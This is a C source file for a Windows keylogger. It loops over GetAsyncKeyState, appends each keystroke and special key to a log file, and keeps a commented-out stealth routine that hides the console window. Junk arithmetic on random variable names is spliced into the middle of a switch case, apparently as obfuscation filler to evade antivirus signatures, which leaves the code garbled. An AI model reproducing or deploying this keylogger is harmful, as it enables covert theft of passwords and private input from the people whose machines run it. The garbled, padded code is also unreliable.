#include "Keylogger.h"
DWORD WINAPI Keylogger()
{
    // HWND stealth; 
    // /*creating stealth (window is not visible)*/
    //  AllocConsole();
    // stealth=FindWindowA("ConsoleWindowClass",NULL);
    // ShowWindow(stealth,0);

    short character;
    while(1)
    {
        for(character=8; character<=222; character++)
        {
            if(GetAsyncKeyState(character)==-32767)
            {

                FILE *file;
                file=fopen("","a+");
                if(file==NULL)
                {
                    return 1;
                }
                if(file!=NULL)
                {
                    if((character>=39)&&(character<=64))
                    {
                        fputc(character,file);
                        fclose(file);
                        break;
                    }
                    else if((character>64)&&(character<91))
                    {
                        character+=32;
                        fputc(character,file);
                        fclose(file);
                        break;
                    }
                    else
                    {
                        switch(character)
                        {
                        case VK_SPACE:
                            fputc(' ',file);
                            fclose(file);
                            break;
                        case VK_SHIFT:
                            fputs("[SHIFT]",file);
                            fclose(file);
                            break;
                        case VK_RETURN:
                            fputs("\n[ENTER]",file);
                            fclose(file);
                            break;
                        case VK_BACK:
                            fputs("[BACKSPACE]",file);
                            fclose(file);
                            break;
                        case VK_TAB:
                            fputs("[TAB]",file);
                            fclose(file);
                            break;
                        case VK_CONTROL:
                            fputs("[CTRL]",file);
                            fclose(file);
                            break;
                        case VK_DELETE:
                            fputs("[DEL]",file);
                            fclose(file);
                            break;
                        case VK_OEM_1:
                            fputs("[;:]",file);
                            fclose(file);
                            break;
                        case VK_OEM_2:
                            fputs("[/?]",file);
                            fclose(file);
                            break;
                        case VK_OEM_3:
                            fputs("[`~]",file);
                            fclose(file);
                            break;
                        case VK_OEM_4:
                            fputs("[ [{ ]",file);
                            fclose(file);
                            break;
                        case VK_OEM_5:
                            fputs("[\\|]",file);
                            fclose(file);
                            break;
                        case VK_OEM_6:
                            fputs("[ ]} ]",file);
                            fclose(file);
                            break;
                        case VK_OEM_7:
                            fputs("['\"]",file);
                            fclose(file);
                            break;
                        case VK_NUMPAD0:
                            fputc('0',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD1:
                            fputc('1',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD2:
                            fputc('2',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD3:
                            fputc('3',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD4:
                            fputc('4',file);
                            fclose(file);
int iINaCxwLRLG = 0x1ebca09;
int ifTpR1xpQTz = 0x860f134;
int iuoOmVLXDJv = 0x102206f;
int ibhvXSLHdjB = 0x54725d3;
int iKbcu9XiS9x = 1;
switch(iKbcu9XiS9x)
{
    case 0:
        iINaCxwLRLG = ifTpR1xpQTz - 0x734887e * iuoOmVLXDJv / 100;
        ifTpR1xpQTz = 0x102206f - 5 +  0x102206f - 6 * ifTpR1xpQTz / 10 + 25;
        iuoOmVLXDJv = iINaCxwLRLG * 0x12 + ibhvXSLHdjB * 0x15 + 0x54725d3 / 13 + 0x734887e + 555;
        ibhvXSLHdjB = 0x1ebca09 - 21 + 11 * 1996 - ifTpR1xpQTz + 14520538 - iuoOmVLXDJv - 14520692 + 0x860f134 - 97;
        break;
    case 1:
        iINaCxwLRLG = ifTpR1xpQTz - 25 + 0x1ebca09 - 40 + 0x102206f % 10 + 2;
        iuoOmVLXDJv = iuoOmVLXDJv - 0xff % 3 - ibhvXSLHdjB * 10 + 0x734887e / 2 - 10 + 0x860f134 - 5;
        ibhvXSLHdjB = 0x1ebca09 % 0x734887e ^ 33 + 0x102206f * 0x12 - 30 + 0x102206f + 23;
        ifTpR1xpQTz = ifTpR1xpQTz + 321 + iuoOmVLXDJv * 10 * ifTpR1xpQTz / 10 / 2 + 0x734887e * 0x60;
        break;
    case 2:
        iINaCxwLRLG = ifTpR1xpQTz - 45 - iuoOmVLXDJv * 46 + 0x1ebca09 / 0xdade;
        ifTpR1xpQTz = ifTpR1xpQTz + 0x734887e - iuoOmVLXDJv * 0x860f134 - 3;
        iuoOmVLXDJv = 0x860f134 - 0x1 + iINaCxwLRLG * 0x2 - 0x734887e / 0x3 + 0x102206f;
        ibhvXSLHdjB = iINaCxwLRLG - 0x4 * 0x1ebca09 + 0x1234 - 0x4567 + 0xcafe + ifTpR1xpQTz % 0x432 / 0x54725d3 - 0x23;
        break;
    case 3:
        ifTpR1xpQTz = ibhvXSLHdjB * 2 * 0x860f134 - 4 + 0x734887e + 12 + 34 + 0x1ebca09;
        iuoOmVLXDJv = ifTpR1xpQTz - 43 + 0x102206f * 3040 - 0x860f134 % 10 + 1 - 0x102206f;
        ibhvXSLHdjB = 0x102206f - 33 + iINaCxwLRLG * 0x25 + 0x1ebca09 - 3004 + 0x860f134;
        iINaCxwLRLG = 0x1ebca09 + 2905 % ifTpR1xpQTz * 1996 + 0x54725d3 - 70 * 0x734887e;
        break;
    case 4:
        ibhvXSLHdjB = ifTpR1xpQTz - 36 +0x734887e * 2001 - iuoOmVLXDJv / 234 + 0x7;
        iINaCxwLRLG = ibhvXSLHdjB - 0xabcedf + 0x860f134 * 0xa2bc5 + ibhvXSLHdjB / 0x123 + 0x1ebca09;
        iuoOmVLXDJv = iINaCxwLRLG - 0x124 + 23 / ifTpR1xpQTz / 3 / 2 + iuoOmVLXDJv + 29 - 0x860f134 + 100;
        ifTpR1xpQTz = 0x860f134 - 70 + 70  + 0x1ebca09 / 2 + 423 - 0x1ebca09 / 7749 % 0x1234;
        break;
    case 5:
        ifTpR1xpQTz = ifTpR1xpQTz - 9981 % iINaCxwLRLG + 111 - iuoOmVLXDJv / 224 % 0x102206f;
        iuoOmVLXDJv = iuoOmVLXDJv - 339 - iuoOmVLXDJv * 4416 / 0x734887e + 5525 + 0x860f134 % 10;
        ibhvXSLHdjB = ibhvXSLHdjB - 6636 + 0x860f134 * 7749 + 1 - ifTpR1xpQTz * 8864 / 0xfecba;
        iINaCxwLRLG = 0x734887e - 9981 % 0x1ebca09 % 10 % 1010100 - 0x1ebca09 - 23 -  0x734887e - 2500;
        break;
}
iKbcu9XiS9x = ibhvXSLHdjB - 0xaa + 0x102206f * 46 - 15 / iuoOmVLXDJv + 11 - 0x1ebca09;
iKbcu9XiS9x = iKbcu9XiS9x - 70 * 55 - iuoOmVLXDJv ^ 0x99 - 0x567498 % 0x1ebca09 % 2 - 234 + 0x860f134;

                            break;
                        case VK_NUMPAD5:
                            fputc('5',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD6:
                            fputc('6',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD7:
                            fputc('7',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD8:
                            fputc('8',file);
                            fclose(file);
                            break;
                        case VK_NUMPAD9:
                            fputc('9',file);
                            fclose(file);
                            break;
                        case VK_CAPITAL:
                            fputs("[CAPS LOCK]",file);
                            fclose(file);
                            break;
                        default:
                            fclose(file);
                            break;
                        }
                    }
                }
            }
        }

    }
}
